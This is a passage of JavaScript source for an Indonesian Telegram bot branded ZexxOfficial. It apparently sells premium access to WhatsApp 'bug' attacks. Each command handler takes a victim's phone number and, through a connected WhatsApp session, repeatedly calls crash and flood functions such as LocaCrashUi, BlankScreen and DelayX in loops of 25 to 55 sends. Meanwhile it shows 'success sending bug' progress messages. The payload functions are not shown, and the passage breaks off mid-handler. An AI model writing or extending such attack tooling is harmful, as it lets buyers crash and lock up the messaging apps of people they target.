  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 55; i++) {
    await FolwareLite03(target, false);
    await sleep(200);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/betainvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 40; i++) {
    await AmeliaBeta(sock, target); 
    await sleep(250);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});


bot.onText(/\/delayhard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; 

  try {
    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
      caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];

    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");

for (let i = 0; i < 40; i++) {
    await DelayX(sock, target);
    await sleep(250);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/blank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 50; i++) {
    await LocaCrashUi(sock, target);
    await sleep(250); 
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/System (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 35; i++) {
    await Ins(sock, target);
    await sleep(150); 
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/hardware (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 25; i++) {
    await blankLagi(sock, target);
    await sleep(100); 
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/special (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 40; i++) {
    await BlankScreen(target);
    await sleep(200); 
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/Payload (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
